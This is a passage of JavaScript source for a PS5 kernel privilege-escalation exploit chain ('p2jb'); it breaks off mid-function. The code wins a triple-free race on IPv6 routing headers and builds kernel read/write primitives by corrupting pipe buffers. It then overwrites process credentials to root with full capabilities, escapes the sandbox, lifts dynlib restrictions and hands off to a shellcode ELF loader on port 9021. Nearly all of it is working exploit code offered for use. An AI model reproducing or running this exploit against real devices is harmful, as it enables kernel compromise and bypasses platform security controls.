        async function attempt_race(S) {

            for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
            free_one_fd(S);
            flush_iov_workers(S, 32);
            free_one_fd(S);

            const twins = await find_twins(S, MAX_ROUNDS_TWIN);
            if (!twins) return false;

            rthdr_free_idx(S, twins[1]);
            sched_yield_n(2);

            const verify_buf = malloc(UCRED_SIZE);
            const verify_len = malloc(4);
            let reclaimed = false;

            for (let k = 0; k < MAX_ROUNDS_TRIPLET; k++) {
                S.iov_ws.signal();
                sched_yield_n(4);
                write32(verify_len, 8n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[twins[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (read32(verify_buf) === 1n) {
                    reclaimed = true;
                    break;
                }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!reclaimed) return false;

            S.triplets[0] = twins[0];
            free_one_fd(S);
            syscall(SYSCALL.sched_yield);

            S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (S.triplets[1] === -1) return false;

            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET);
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            if (S.triplets[2] === -1) return false;

            return true;
        }

        async function stage0(S) {
            send_notification("Stage 0\nTriple-free race");

            if (failcheck_path) {
                try { write_file(failcheck_path, ""); } catch (_) { }
            }
            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                if (await attempt_race(S)) {
                    await ulog("stage0: triplets " + S.triplets.join(",") +
                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                        ")");
                    nanosleep_ms(500);
                    return;
                }
                nanosleep_ms(10);
            }
            fail("stage0: race failed after " + TRIPLEFREE_ATTEMPTS + " attempts");
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            write64(buf, iov_ptr);
            write64(buf + 8n, UIO_IOV_COUNT);
            write64(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64(buf + 24n, size);
            write32(buf + 32n, UIO_SYSSPACE);
            write32(buf + 36n, is_read ? 1n : 0n);
            write64(buf + 40n, td);
            write64(buf + 48n, kaddr);
            write64(buf + 56n, size);
        }

        function signal_uio(S, mode) {
            S.active_uio_mode = mode;
            (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
        }

        function wait_uio(S) {
            (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
        }

        function kread_slow(S, kaddr, size) {
            if (!triplets_valid(S)) return null;
            for (let i = 0; i < 64; i += 8) write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0; j < size; j++) write8(S.kread_result_bufs[i] + BigInt(j), 0n);
            }
            write32(S.kread_sndbuf, BigInt(size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kread_sndbuf, 4n);
            syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            write64(S.uio_iov_read + 8n, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n;
            let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 0);
                syscall(SYSCALL.sched_yield);
                write32(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.read, BigInt(S.uio_sock_a),
                        S.kread_result_bufs[i], BigInt(size));
                }
                wait_uio(S);
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            }
            if (!found) return null;
            leaked_iov = read64(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return null;

            syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.kread_result_bufs[i], BigInt(size));
                const v = read64(S.kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    const t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio(S);
                        syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                        S.iov_ws.wait();
                        syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                        S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                        return null;
                    }
                    S.triplets[1] = t;
                    result = S.kread_result_bufs[i];
                }
            }
            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            if (result === null) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return result;
        }

        function kwrite_slow(S, kaddr, data_addr, data_size) {
            if (!triplets_valid(S)) return false;
            write32(S.kwrite_sndbuf, BigInt(data_size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kwrite_sndbuf, 4n);
            write64(S.uio_iov_write + 8n, BigInt(data_size));

            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n; let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 1);
                syscall(SYSCALL.sched_yield);
                write32(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
                }
                wait_uio(S);
            }
            if (!found) return false;
            leaked_iov = read64(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return false;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, false, kaddr, BigInt(data_size));
            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return false;

            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[1] === -1) return false;

            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) return false;

            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return true;
        }

        function kslow64(S, kaddr) {
            for (let attempt = 0; attempt < 3; attempt++) {
                if (triplets_valid(S)) {
                    const buf = kread_slow(S, kaddr, 8);
                    if (buf !== null) {
                        const val = read64(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(S); syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        async function stage1(S) {
            send_notification("Stage 1\nKqueue reclaim");
            rthdr_free_idx(S, S.triplets[1]);

            let kq = 0n; let proc_filedesc = 0n;
            while (true) {
                kq = syscall(SYSCALL.kqueue);
                write32(S.len_out, 256n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === 0x1430000n) {
                    proc_filedesc = read64(S.rthdr_readback + S.OFF.KQ_FDP);
                    break;
                }
                syscall(SYSCALL.close, kq);
            }
            syscall(SYSCALL.close, kq);
            S.proc_filedesc = proc_filedesc;
            await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));

            S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
            if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
        }

        async function stage2(S) {
            send_notification("Stage 2\nLeak pipe data pointers");
            await ulog("stage2: leaking pipe pointers...");

            repair_triplets(S); nanosleep_ms(100);
            const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
            if (!fdescenttbl) fail("stage2: fdescenttbl read failed");
            S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!master_fp) fail("stage2: master_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!victim_fp) fail("stage2: victim_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.master_pipe_data = kslow64(S, master_fp);
            if (!S.master_pipe_data) fail("stage2: master_pipe_data read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.victim_pipe_data = kslow64(S, victim_fp);
            if (!S.victim_pipe_data) fail("stage2: victim_pipe_data read failed");

            if (S.master_pipe_data === S.victim_pipe_data)
                fail("stage2: master_pipe == victim_pipe (aliased - bad leak)");

            await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                " victim_pipe=" + toHex(S.victim_pipe_data));
        }

        async function stage3(S) {
            send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
            await ulog("stage3: corrupting pipe buffer...");

            const pipe_overwrite = malloc(24);
            write32(pipe_overwrite, 0n);
            write32(pipe_overwrite + 4n, 0n);
            write32(pipe_overwrite + 8n, 0n);
            write32(pipe_overwrite + 12n, BigInt(PAGE_SIZE));
            write64(pipe_overwrite + 16n, S.victim_pipe_data);

            nanosleep_ms(100);

            let ok = false;
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(100); syscall(SYSCALL.sched_yield);
            }
            if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
            syscall(SYSCALL.sched_yield);

            const pipe_cmd = malloc(24);
            const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
                write32(pipe_cmd, BigInt(cnt));
                write32(pipe_cmd + 4n, BigInt(inp));
                write32(pipe_cmd + 8n, BigInt(out));
                write32(pipe_cmd + 12n, BigInt(size));
                write64(pipe_cmd + 16n, buf_addr);
                syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
                syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
            };

            S.kread = (buf_addr, kaddr, size) => {
                set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
            };
            S.kwrite = (kaddr, buf_addr, size) => {
                set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
            };

            for (let i = 0n; i < 64n; i += 8n) write64(S.scratch_big + i, 0n);

            S.kread32 = (k) => { S.kread(S.scratch_big, k, 4); return read32(S.scratch_big); };
            S.kread64 = (k) => { S.kread(S.scratch_big, k, 8); return read64(S.scratch_big); };
            S.kwrite32 = (k, v) => { write32(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 4); };
            S.kwrite64 = (k, v) => { write64(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 8); };

            let verified = false;
            for (let attempt = 0; attempt < 3; attempt++) {
                if (S.kread64(S.master_pipe_data + 0x10n) === S.victim_pipe_data) {
                    verified = true; break;
                }
                nanosleep_ms(100); repair_triplets(S);
                kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
            }
            if (!verified) fail("stage3: verify failed");
            await ulog("stage3: kernel r/w achieved");

            await stage3_cleanup(S);
        }

        async function stage3_cleanup(S) {
            const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
            const bump = (fp, delta) => {
                const rc = S.kread32(fp + 0x28n);
                if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
            };
            const null_rthdr = fd => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const f_data = S.kread64(fp);
                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
                const so_pcb = S.kread64(f_data + 0x18n);
                if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                const pktopts = S.kread64(so_pcb + S.OFF.INPCB_PKTOPTS);
                if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
                S.kwrite64(pktopts + S.OFF.IP6PO_RTHDR, 0n);
            };

            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                const fp = get_fp(fd);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                bump(fp, 0x100);
            }

            if (S.free_fd_idx < S.free_fds.length) {
                const sample_fd = S.free_fds[S.free_fd_idx];
                const sample_fp = S.kread64(S.fd_ofiles + BigInt(sample_fd) * S.OFF.FILEDESCENT_SIZE);
                if (sample_fp !== 0n && (sample_fp >> 48n) === 0xFFFFn) {
                    const fcred = S.kread64(sample_fp + 0x10n);
                    if (fcred !== 0n && (fcred >> 48n) === 0xFFFFn) {
                        S.ucred_A = fcred;
                    }
                }
            }

            for (const fd of S.ipv6_sockets) null_rthdr(fd);

            for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                syscall(SYSCALL.close, BigInt(S.free_fds[i]));
            }

            for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));

            syscall(SYSCALL.close, BigInt(S.iov_sock_a));
            syscall(SYSCALL.close, BigInt(S.iov_sock_b));
            syscall(SYSCALL.close, BigInt(S.uio_sock_a));
            syscall(SYSCALL.close, BigInt(S.uio_sock_b));

            S.iov_ws.signal();
            S.uio_read_ws.signal();
            S.uio_write_ws.signal();
            syscall(SYSCALL.sched_yield);
            syscall(SYSCALL.sched_yield);
            await ulog("stage3b: workers signalled (D5, left parked)");

            {
                const [sr, sw] = create_pipe();
                const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
                const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
                const pid_buf = malloc(4);
                write32(pid_buf, our_pid);
                syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

                const sigio_fp = S.kread64(S.fd_ofiles +
                    BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);

                if (sigio_fp === 0n || (sigio_fp >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio fp");

                const sigio_pipe = S.kread64(sigio_fp);

                if (sigio_pipe === 0n || (sigio_pipe >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio pipe");

                const pipe_sigio = S.kread64(sigio_pipe + S.OFF.PIPE_SIGIO);

                if (pipe_sigio === 0n || (pipe_sigio >> 48n) !== 0xFFFFn)
                    fail("stage3b: no sigio");

                const curproc = S.kread64(pipe_sigio);

                if (curproc === 0n || (curproc >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad curproc");

                if (S.kread32(curproc + S.OFF.PROC_PID) !== our_pid)
                    fail("stage3b: pid mismatch");

                syscall(SYSCALL.close, BigInt(sigio_rfd));
                syscall(SYSCALL.close, BigInt(sigio_wfd));

                S.curproc = curproc;
                S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
                S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
                await ulog("stage3b: curproc=" + toHex(curproc) +
                    " fd=" + toHex(S.proc_fd));
            }

            await ulog("stage3b: race cleanup done");

            await js_sleep(3000);
        }

        async function stage4(S) {
            send_notification("Stage 4\nFind rootvnode");

            if (!S.curproc || !S.proc_ucred || !S.proc_fd)
                fail("stage4: curproc/proc_ucred/proc_fd missing (should have " +
                    "been set in stage3_cleanup)");
            const curproc = S.curproc;
            await ulog("stage4: using curproc=" + toHex(curproc) +
                " from stage3_cleanup");

            let p = curproc, kernel_proc = null;
            for (let i = 0; i < 1000; i++) {
                if (p === 0n) break;
                if ((p >> 48n) !== 0xFFFFn) break;
                if (S.kread32(p + S.OFF.PROC_PID) === 0n) { kernel_proc = p; break; }
                p = S.kread64(p + 0n);
            }
            if (!kernel_proc) fail("stage4: kernel proc (pid=0) not found");

            const kernel_fd = S.kread64(kernel_proc + S.OFF.PROC_FD);
            if (kernel_fd === 0n || (kernel_fd >> 48n) !== 0xFFFFn)
                fail("stage4: kernel_fd bad: " + toHex(kernel_fd));

            const rootvnode = S.kread64(kernel_fd + S.OFF.FD_CDIR);
            if (rootvnode === 0n || (rootvnode >> 48n) !== 0xFFFFn)
                fail("stage4: rootvnode bad: " + toHex(rootvnode));

            S.rootvnode = rootvnode;
            await ulog("stage4: kernel_proc=" + toHex(kernel_proc) +
                " rootvnode=" + toHex(rootvnode));
        }

        async function stage5(S) {
            send_notification("Stage 5\nJailbreak");

            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, 1);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVGID, 0);

            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

            let attrs = S.kread64(S.proc_ucred + 0x80n);
            attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
            S.kwrite64(S.proc_ucred + 0x80n, attrs);

            S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.rootvnode);
            S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.rootvnode);

            if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                fail("stage5: jailbreak verify failed");
            }
            await ulog("stage5: jailbreak ok");
        }

        async function stage6(S) {
            send_notification("Stage 6\nResolve kernel data_base");

            const KDATA_MASK = 0xffff804000000000n;
            let p = S.curproc, allproc = 0n;
            for (let i = 0; i < 64; i++) {
                if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
                    ((p - S.OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
                    allproc = p; break;
                }
                p = S.kread64(p + 8n);
            }
            if (allproc === 0n) {
                S.data_base_ok = false;
                await ulog("stage6: allproc not found - elf loader skipped " +
                    "(jailbreak is done)");
                return;
            }
            const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
            S.data_base = data_base;
            await ulog("stage6: allproc=" + toHex(allproc) +
                " data_base=" + toHex(data_base));

            let data_base_ok = true;
            const first_proc = S.kread64(allproc);
            const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
            await ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
            if (!first_proc_ok) data_base_ok = false;

            if (typeof is_jailbroken === "function")
                await ulog("stage6: is_jailbroken() = " + is_jailbroken());
            S.data_base_ok = data_base_ok;
            if (!data_base_ok) {
                await ulog("stage6: data_base check FAILED - skipping the elf " +
                    "loader. The jailbreak is complete.");
                return;
            }
        }

        async function stage7(S) {
            send_notification("Stage 7\nFinalize: dynlib restrictions");

            const is_kptr = (v) =>
                (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;

            const p_dynlib = S.kread64(S.curproc + 0x3E8n);

            if (!is_kptr(p_dynlib))
                throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));

            S.kwrite32(p_dynlib + 0x118n, 0);
            S.kwrite64(p_dynlib + 0x18n, 1n);

            S.kwrite64(p_dynlib + 0xF0n, 0n);
            S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);

            const dynlib_eboot = S.kread64(p_dynlib + 0x00n);

            if (!is_kptr(dynlib_eboot))
                throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));

            const eboot_segments = S.kread64(dynlib_eboot + 0x40n);

            if (!is_kptr(eboot_segments))
                throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));

            S.kwrite64(eboot_segments + 0x08n, 0n);
            S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
            await ulog("stage7: dynlib patched " +
                "(syscalls + dlsym unrestricted, dynlib=" +
                toHex(p_dynlib) + ")");

            await ulog("stage7: dynlib maximized; jailbreak fully finalized");
            send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");

            await ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");

        }

        async function stage_load_elf(S) {
            await ulog("stage_elfldr: entered (Y2JB 1.4 aioshellcode handoff)");
            if (!S.data_base_ok) {
                await ulog("stage_elfldr: kernel data_base not resolved - skipped");
                send_notification("Stage 7\nelf loader skipped (no data_base)");
                return;
            }
            try {
                if (typeof load_aioshellcode !== "function") {
                    await ulog("stage_elfldr: load_aioshellcode not in scope - " +
                        "the PS5 must be running Y2JB >= 1.4");
                    send_notification("Stage 7\nUpdate the PS5 to Y2JB 1.4\n" +
                        "(elf loader skipped)");
                    return;
                }

                const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
                const master_pipe = [BigInt(S.master_rfd), BigInt(S.master_wfd)];
                const victim_pipe = [BigInt(S.victim_rfd), BigInt(S.victim_wfd)];
                await ulog("stage_elfldr: handoff -> load_aioshellcode " +
                    "(allproc=" + toHex(allproc) +
                    " master=" + S.master_rfd + "," + S.master_wfd +
                    " victim=" + S.victim_rfd + "," + S.victim_wfd + ")");

                await load_aioshellcode(allproc, master_pipe, victim_pipe);

                await ulog("stage_elfldr: load_aioshellcode returned - " +
                    "elfldr should now be listening on :9021");
                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                    "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
            } catch (e) {
                await ulog("stage_elfldr: kexp handoff failed: " + e.message +
                    " (jailbreak unaffected)");
                send_notification("Stage 7\nkexp failed: " + e.message +
                    "\n(jailbreak still complete)");
            }
        }

        send_notification(p2jb_version + "\nport by matem6");

        {
            if (typeof load_aioshellcode !== "function") {
                await ulog("FATAL: Y2JB >= 1.4 required");
                send_notification("p2jb requires Y2JB 1.4 or newer\n" +
                    "(update y2jb and retry)");
                return;
            }
        }

        try {
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("p2jb: already jailbroken");
                return;
            }
            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
            if (file_exists(failcheck_path) ||
                file_exists("/user/temp/common_temp/p2jb.fail")) {
                send_notification("p2jb already ran this boot - reboot your\n" +
                    "PS5 before running p2jb again");
                return;
            }
        } catch (_) { failcheck_path = null; }

        ensure_kernel_offset();

        my_init_threading();

        const S = make_state();

        setup_cpu_masks(S);
        setup_worker_sockets(S);
        setup_iov_buffers(S);
        setup_uio_buffers(S);
        setup_pipes_kernrw(S);

        await ulog(p2jb_version + " - port by matem6");
        await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
            " victim=" + S.victim_rfd + "," + S.victim_wfd);

        const leak_nw = LEAK_CORES.length;
        let eta_minutes;

        switch (leak_nw) {
            case 1: eta_minutes = 120; break;
            case 2: eta_minutes = 90; break;
            case 3: eta_minutes = 60; break;
            case 4: eta_minutes = 50; break;
            default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
        }
        const eta_str = eta_minutes < 60
            ? "~" + eta_minutes + " min"
            : "~" + Math.floor(eta_minutes / 60) + "h" +
            (eta_minutes % 60 ? " " + (eta_minutes % 60) + " min" : "");

        const fmt_hm = d =>
            String(d.getHours()).padStart(2, '0') + ':' +
            String(d.getMinutes()).padStart(2, '0');

        const t_start = new Date();
        const t_eta = new Date(t_start.getTime() + eta_minutes * 60000);

        await ulog("host OK - starting " + leak_nw + "-core leak at " +
            fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) +
            " (" + eta_str + "); no further log output until then " +
            "(this is normal, do not interrupt)");

        setup_workers(S);
        setup_ipv6_spray(S);

        S.orig_main_core = get_current_core();
        await ulog("orig_main_core=" + S.orig_main_core);

        apply_main_thread_pinning(S);
        await prepare_fds(S);
        await stage0(S);

        await stage1(S);
        await stage2(S);
        await stage3(S);

        await stage4(S);
        await stage5(S);

        await stage6(S);
        await stage7(S);
        await stage_load_elf(S);

        try {
            const B = S.proc_ucred;
            if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                await ulog("post-jb migrate: B invalid, skip");
            } else {

                const nfiles = Number(S.kread32(S.fd_ofiles - S.OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
                let fd_migrated = 0;
                const migrated_creds = new Set();

                if (nfiles > 0 && nfiles <= 0x10000) {
                    for (let i = 0; i < nfiles; i++) {
                        const fp = S.kread64(S.fd_ofiles + BigInt(i) * S.OFF.FILEDESCENT_SIZE);
                        if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
                        const fcred = S.kread64(fp + 0x10n);
                        if (fcred === B) continue;
                        if ((fcred >> 48n) !== 0xFFFFn) continue;
                        S.kwrite64(fp + 0x10n, B);
                        migrated_creds.add(toHex(fcred));
                        fd_migrated++;
                    }
                }

                await ulog("post-jb migrate: " + fd_migrated + " fds f_cred -> B " +
                    "(" + migrated_creds.size + " distinct cred kptrs replaced)");

                const TD_UCRED_OFF = 0x140n;
                let td_migrated = 0;
                const migrated_tcreds = new Set();
                const main_thread = S.kread64(S.curproc + 0x10n);

                if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
                    let td = main_thread, walked = 0;
                    while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                        walked++;
                        if (S.kread64(td + 0x08n) !== S.curproc) {
                            await ulog("post-jb migrate: td_proc mismatch, abort thread walk");
